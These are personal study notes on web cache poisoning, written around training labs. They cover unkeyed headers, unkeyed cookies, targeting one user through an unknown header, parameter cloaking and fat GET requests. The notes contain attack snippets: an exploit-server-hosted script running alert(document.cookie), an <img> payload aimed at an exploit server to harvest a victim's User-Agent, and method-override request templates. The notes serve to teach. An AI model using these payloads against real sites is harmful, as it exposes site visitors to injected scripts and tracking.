## Introduction
If a server had to send a new response to every single HTTP request separately, this would likely overload the server, resulting in latency issues and a poor user experience, especially during busy periods. Caching is primarily a means of reducing such issues.

The cache sits between the server and the user, where it saves (caches) the responses to particular requests, usually for a fixed amount of time. If another user then sends an equivalent request, the cache simply serves a copy of the cached response directly to the user, without any interaction from the back-end. This greatly eases the load on the server by reducing the number of duplicate requests it has to handle.

Generally speaking, constructing a basic web cache poisoning attack involves the following steps:
1. Identify and evaluate unkeyed inputs
2. Elicit a harmful response from the back-end server
3. Get the response cached

> **NOTE:** 
> The HTTP **`X-Forwarded-Host`** (XFH) [request header](https://developer.mozilla.org/en-US/docs/Glossary/Request_header) is a de-facto standard header for identifying the original host requested by the client in the `Host` HTTP request header.
> 
> The HTTP **`X-Forwarded-Proto`** (XFP) [request header](https://developer.mozilla.org/en-US/docs/Glossary/Request_header) is a de-facto standard header for identifying the protocol (HTTP or HTTPS) that a client used to connect to a [proxy](https://developer.mozilla.org/en-US/docs/Glossary/Proxy_server) or load balancer.
## Exploiting Cache Design Flaws
###  Lab: Web cache Poisoning with an Unkeyed Header
First,  send a request to see if you `Age: 0` and `X-Cache: miss` the first time you send the request.
![[file-20250726204006315.png]]
The second time you will not get the same  `Age: 0` and `X-Cache: miss` response in the request because the the server has already stored the cache with the keyed value. So now, we find the unkeyed value using **Param Miner**. After using the `Guess Headers` options in it, we navigate to the Target tab and check the secret header.
![[file-20250726204438269.png]]
After that you can just add the secret header and point it to the exploit server.

> **NOTE**: Do not forget to check the response body (The app is fetching a JavaScript resource library for the front end from the end). So, after successfully poisoning using the `X-Forwarded-Host` we are basically sending the request to exploit server instead of server.

The exploit server will have the URI `/resources/js/tracking.js` because the application was fetching a JavaScript file for the front-end which we poisoned with `alert(document.cookie);`
![[file-20250726205007932.png]]
### Lab: Web cache poisoning with an unkeyed cookie
![[file-20250726222139873.png]] 
### Lab: Web cache Poisoning with an Unkeyed Header
 Running param miner you find the 2 headers, `X-Forwarded-Host` and `X-Forwarded-Scheme`. The website requires HTTPS connection. So, if a request used another proto, the website redirects to the `HTTPS` inherently.
 So, we proceed first by adding the `X-Forwarded-Scheme` header and notice the **302** redirect and then add the `X-Forwarded-Header` to make that HTTPS redirect to our exploit server.
 > **NOTE:** Use the cache-buster to avoid any live-users visiting the page and test the cache response.
 
![[file-20250727211159946.png]]
### Lab: Targeted web cache poisoning using an unknown header
In this lab, the `User-Agent` header is the part of the  keyed value in the cache. Hence, you can use to probe the website to poison the user's session after poisoning the cache.

So first, we find the secret header which in this case is the `X-Host`Header which contains the address of our exploit server.

After successfully confirming the poisoning the request, we can now post a comment which allows HTML comments to be posted like so,`<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />` which will cause the victim's browser to interact with the exploit server.
![[file-20250727220740268.png]]

```
<SNIP>
10.0.3.114      2025-07-27 21:00:17 +0000 "GET /foo HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
<SNIP>
```
Get the above `User-Agent` and paste it in the already poisoned request to poison the user's session.
![[file-20250727220955325.png]]
## Cache probing methodology
The methodology involves the following steps:
1. Identify a suitable cache oracle
2. Probe key handling
3. Identify an exploitable gadget

## Cache parameter cloaking

If the cache excludes a harmless parameter from the cache key, and you can't find any exploitable gadgets based on the full URL, you'd be forgiven for thinking that you've reached a dead end. However, this is actually where things can get interesting.

If you can work out how the cache parses the URL to identify and remove the unwanted parameters, you might find some interesting quirks. Of particular interest are any parsing discrepancies between the cache and the application. This can potentially allow you to sneak arbitrary parameters into the application logic by "cloaking" them in an excluded parameter.
### Lab: Parameter cloaking
Chain Parameter Pollution to Web Cache  poisoning by exploiting the parameter cloaking vulnerability. The cloaking exists because the frontend cache parses the query parameter separator differently from the backend application.
![[file-20250801221947233.png]]
```embed
title: "Parameter cloaking Jan 24, 2023"
image: "https://siunam321.github.io/assets/images/ogimage.png"
description: "My personal website"
url: "https://siunam321.github.io/ctf/portswigger-labs/Web-Cache-Poisoning/cache-7/"
aspectRatio: "100"
```
### Lab: Web cache poisoning via a fat GET request
In select cases, the HTTP method may not be keyed. This might allow you to poison the cache with a `POST` request containing a malicious payload in the body. Your payload would then even be served in response to users' `GET` requests. Although this scenario is pretty rare, you can sometimes achieve a similar effect by simply adding a body to a `GET` request to create a "fat" `GET` request:

```
GET /?param=innocent HTTP/1.1 
… 
param=bad-stuff-here
```
In this case, the cache key would be based on the request line, but the server-side value of the parameter would be taken from the body.
![[file-20250801223945452.png]]This is only possible if a website accepts `GET` requests that have a body, but there are potential workarounds. You can sometimes encourage "fat `GET`" handling by overriding the HTTP method, for example:

```
GET /?param=innocent HTTP/1.1 
Host: innocent-website.com 
X-HTTP-Method-Override: POST 
… 
param=bad-stuff-here
```

As long as the `X-HTTP-Method-Override` header is unkeyed, you could submit a pseudo-`POST` request while preserving a `GET` cache key derived from the request line.